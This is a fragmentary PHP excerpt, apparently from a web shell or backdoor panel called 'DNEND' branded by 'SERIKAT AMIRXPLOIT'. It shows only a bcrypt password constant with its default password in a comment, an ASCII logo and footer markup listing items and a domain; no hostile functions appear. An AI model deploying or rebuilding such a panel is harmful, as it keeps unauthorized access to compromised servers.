<?php
// ===================================================
// GANTI PASSWORD DI SINI YA, GANTI PASS PAKE BCRYPT //default pass amirxploit
define('DNEND_PASS','$2a$12$rZ2Ac62Uue5D9McfppvflesReB94xiWthKVM9vb/bLkn6Jqcbl3ue');
// ===================================================
...
<div class="pf">DNEND <?php echo DNEND_VER; ?> &bull; by <b>SERIKAT AMIRXPLOIT</b></div>
</div>
...
███  ███ ███      ███ ▄███▄ ███  ▀███   ███▀ ▀███ ██████▀  
    ...
    <div class="logo-meta"><?php echo DNEND_VER; ?> &bull; by <b>SERIKAT AMIRXPLOIT</b> &bull; <?php echo dnH($domain); ?></div>
  </div>
</div>
...
<div class="pf">
  DNEND <?php echo DNEND_VER; ?> &bull; by <b>SERIKAT AMIRXPLOIT</b> &bull; <?php echo count($items); ?> items &bull; <?php echo dnH($domain); ?><br>
  <small style="color:var(--tx3)">Dev AMIRXDPLOT &copy; 2026</small>
</div>
</div>
